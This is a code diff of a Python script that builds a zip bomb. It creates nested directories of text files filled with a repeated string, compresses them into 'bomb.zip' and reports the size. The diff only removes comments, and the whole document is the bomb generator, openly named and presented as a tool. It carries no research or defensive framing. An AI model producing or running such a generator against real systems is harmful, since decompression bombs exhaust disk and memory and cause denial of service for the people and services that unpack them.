@@ -5,7 +5,7 @@ import threading
 def create_files(directory, files_to_create, content):
     for i in range(files_to_create):
         with open(os.path.join(directory, f"{i}.txt"), "w") as f:
-            f.write(content * 1000)  # increase content density for better compression
+            f.write(content * 1000)  
 
 def generate_zip_bomb(directory, num_directories, files_per_directory, file_size_mb, content="Zip bomb file."):
     print("Creating zip bomb...")
@@ -15,7 +15,7 @@ def generate_zip_bomb(directory, num_directories, files_per_directory, file_size
     for i in range(num_directories):
         new_dir = os.path.join(directory, str(i))
         os.makedirs(new_dir)
-        create_files(new_dir, files_per_directory, content)  # Fix here: pass files_per_directory instead of total_files
+        create_files(new_dir, files_per_directory, content)  
 
     print("Zip bomb created successfully.")
     print("Creating zip file...")
@@ -25,7 +25,7 @@ def generate_zip_bomb(directory, num_directories, files_per_directory, file_size
             for file in files:
                 zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), directory))
 
-    # calculate the size of the zip bomb in MB
+   
     zip_bomb_size = os.path.getsize("bomb.zip") / (1024 * 1024)
     print(f"Size of the zip bomb: {zip_bomb_size:.2f} MB")
 
